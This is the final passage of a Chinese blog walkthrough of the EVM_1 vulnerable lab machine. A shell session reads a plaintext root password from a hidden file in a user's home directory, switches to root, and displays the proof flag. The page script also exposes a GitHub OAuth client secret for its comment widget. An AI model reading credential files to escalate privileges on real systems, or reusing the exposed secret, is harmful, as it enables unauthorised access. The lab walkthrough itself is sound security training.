+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ <span class="hljs-built_in">cat</span> .root_password_ssh.txt<br>sh.txtoot_password_s <br>willy26<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ <span class="hljs-built_in">cat</span> .mysql_history<br><span class="hljs-built_in">cat</span> .mysql_history<br>_HiStOrY_V2_<br><span class="hljs-built_in">exit</span>\040<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ su -<br>su -<br>Password: _HiStOrY_V2_<br><br>su: Authentication failure<br>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ ^[[A<br>su -<br>Password: willy26<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>成功切换为 root 用户，最后来个定妆照</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>voila you have successfully pwned me :) !!!<br>:D<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:06:73:f2 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.103/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe06:73f2/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 52:54:00:c5:7d:1b brd ff:ff:ff:ff:ff:ff<br>root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>EVM_1 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/06/0c6297e238cc.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/a671dd67ea4a.html" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/15e7bb7309ab.html" title="DPWWN_1靶机">
+                        <span class="hidden-mobile">DPWWN_1靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '88a2e7c838508746979a0acfe0b6c03e'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
